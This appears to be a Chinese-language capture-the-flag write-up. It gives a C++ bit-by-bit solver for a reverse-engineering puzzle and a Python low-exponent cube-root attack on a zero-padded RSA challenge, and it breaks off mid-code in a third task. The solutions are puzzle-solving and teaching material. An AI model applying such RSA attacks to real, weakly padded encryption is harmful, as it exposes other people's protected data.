<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="EasyMBA"><a href="#EasyMBA" class="headerlink" title="EasyMBA"></a>EasyMBA</h3><p>简单位运算的方程<br>由于位运算的高位不会对低位产生影响 所以可以看成是每个bit的方程 这个方程一阶命题逻辑方程，可能多解，也可能无解。多解情况下可以回溯。<br>这里用unsigned int 模拟每个寄存器 然后用运算符翻译一下汇编的指令，模拟之后一个个bit枚举即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">checker1 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2833100173</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-0x9c68db12=0xc74d27b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//79606647</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0x50994505</span> ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> b = <span class="number">0x57B0131A</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ans = ~a-b;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">8</span>)std::cout&lt;&lt;x&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">if</span>((((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>) &amp; (<span class="number">1</span>&lt;&lt;i))== (ans &amp; (<span class="number">1</span>&lt;&lt;i)))&#123;</span><br><span class="line">	</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(ans &amp; (<span class="number">1</span>&lt;&lt;i))&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>)&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker3_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0x2334EB06</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax  = ~eax;</span><br><span class="line">	eax |=  <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = eax+ecx;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax +=eax;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax *= (<span class="number">-0xa</span>);</span><br><span class="line">	eax += ecx;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//84381514</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;cant find answer&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker4_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0xDE2B3E84</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rdi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rsi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax +=  edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx + eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax += eax;</span><br><span class="line"></span><br><span class="line">	esi  = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	eax += esi;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax = -eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	edx |= <span class="number">0xCD731B78</span>;</span><br><span class="line">	</span><br><span class="line">	edx = edx;</span><br><span class="line">	edx = ~edx;</span><br><span class="line">	edx += edx;</span><br><span class="line">	eax -= edx;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0x328CE487</span>;</span><br><span class="line">	esi = edx;</span><br><span class="line">	esi -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xCD731B78</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = esi+eax;</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	eax = x;</span><br><span class="line">	</span><br><span class="line">	rsi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rsi |= rax;</span><br><span class="line">	eax = x;</span><br><span class="line">	rax = x;</span><br><span class="line">	</span><br><span class="line">	rdi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rdi &amp;= rax;</span><br><span class="line">	</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	rax = <span class="number">0</span>;</span><br><span class="line">	rax -=rdi;</span><br><span class="line">	rax += rax;</span><br><span class="line">	</span><br><span class="line">	rsi -= rax;</span><br><span class="line">	rax = rsi;</span><br><span class="line">	esi = rsi &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	eax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	esi = eax;</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	eax -= esi;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax += <span class="number">0x189125DA</span>;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker4</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//69863554</span></span><br><span class="line">	std::stack&lt;<span class="type">int</span>&gt; try_stack;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="type">bool</span> use0 = <span class="built_in">checker4_check</span>(x,i);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> xx = x | (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="type">bool</span> use1 = <span class="built_in">checker4_check</span>(xx,i);</span><br><span class="line">		<span class="keyword">if</span>(use0 &amp; !use1)&#123;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp; !use0)&#123;</span><br><span class="line">			x = xx;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp;&amp; use0)&#123;</span><br><span class="line">			try_stack.<span class="built_in">push</span>(i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:both,choose 0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">// first try 0</span></span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; cant choose &quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(!try_stack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">			i = try_stack.<span class="built_in">top</span>();</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;return to&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			try_stack.<span class="built_in">pop</span>();</span><br><span class="line">			x &amp;=  ~((~<span class="number">0</span>)&lt;&lt;i);</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			<span class="keyword">continue</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;x&lt;&lt;<span class="string">&quot; wrong&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">checker4</span>();</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if(checker4_check(0b000010,4))&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;correct&quot;;</span></span><br><span class="line"><span class="comment">	&#125;else&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;wrong&quot;;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>做完发现其实可以F5直接看反汇编 用C语言的逻辑运算来判断更简单</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>明文转换后长度很短 可以直接低指数加密攻击 开方<br>这里末尾补0相当于乘2的n次方 底数还是单项式 可以左右同乘逆来使得左边恢复到较小的明文 然后开方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baby_rsa</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    flag b&#x27;ab&#x27;</span></span><br><span class="line"><span class="string">    pad  b&#x27;ab\x00\x00&#x27;</span></span><br><span class="line"><span class="string">    hex  b&#x27;61 62 00 00&#x27;</span></span><br><span class="line"><span class="string">    int 0x6162 * 2**16</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    x = pad*8</span></span><br><span class="line"><span class="string">    (m*2**x)**e mod n = c</span></span><br><span class="line"><span class="string">    m**e * 2**xe mod n = c</span></span><br><span class="line"><span class="string">    m**e mod n = c * (2**ex)-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    N=<span class="number">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span></span><br><span class="line">    c=<span class="number">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    def pad(m):</span></span><br><span class="line"><span class="string">        return m + b&#x27;\x00&#x27; * (255 - len(m))</span></span><br><span class="line"><span class="string">    flag = b&#x27;0ops&#123;123&#125;&#x27;</span></span><br><span class="line"><span class="string">    p = 111345042336617079395655969248384725462942989722982708986115750759582884327143846096591193086377487304656518041676837325011033537087510526817704471697404176187078871161470888545207754020019021746157064253305053303512621476201052191949956657153110512813676935622000049248802125683401544972238560398010672992601</span></span><br><span class="line"><span class="string">    q = 153271507501132502258967640136039635283134834243664743747270391389487283488801676850443858493501493587201641571605287451116678489374548421733711540807596096746696511663395091514758222006766300592141141966606374343902616443452703301934074963209880423996150731879969146868471922084764152939831612389213674285053</span></span><br><span class="line"><span class="string">    print(p,q)</span></span><br><span class="line"><span class="string">    n = p * q</span></span><br><span class="line"><span class="string">    N = n</span></span><br><span class="line"><span class="string">    m=int(flag.hex(), 16)</span></span><br><span class="line"><span class="string">    print(int(flag.hex(), 16)*2**((255-len(flag))*8))</span></span><br><span class="line"><span class="string">    print(int(pad(flag).hex(), 16))</span></span><br><span class="line"><span class="string">    ct = pow(int(pad(flag).hex(), 16), e, n)</span></span><br><span class="line"><span class="string">    c = ct</span></span><br><span class="line"><span class="string">    print(&#x27;c:&#x27;,c)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> flag_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="comment">#if flag_length!=len(flag):</span></span><br><span class="line">            <span class="comment">#continue</span></span><br><span class="line">        <span class="built_in">print</span>(flag_length)</span><br><span class="line">        pad = <span class="number">255</span>-flag_length</span><br><span class="line">        t = e*pad*<span class="number">8</span></span><br><span class="line">        <span class="comment">#print(2**t)</span></span><br><span class="line">        inv = gmpy2.invert(<span class="number">2</span>**t,N)</span><br><span class="line">        <span class="comment">#print(inv*2**t%N)</span></span><br><span class="line">        m3 = c*inv%N</span><br><span class="line">        m,flag = gmpy2.iroot(gmpy2.mpz(m3),e)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">              <span class="built_in">print</span>(long_to_bytes(m.digits()))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="RSFL"><a href="#RSFL" class="headerlink" title="RSFL"></a>RSFL</h3><p>数据每次向左移一位 右边补一位为：</p>
<ul>
<li>若二进制表示中1个数为奇数 补1</li>
<li>若二进制表示中1个数为偶数 补0</li>
</ul>
<p>左边移出的信息通过右边补的体现了 lsb通过tmp给出 可以复原<br>第一种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 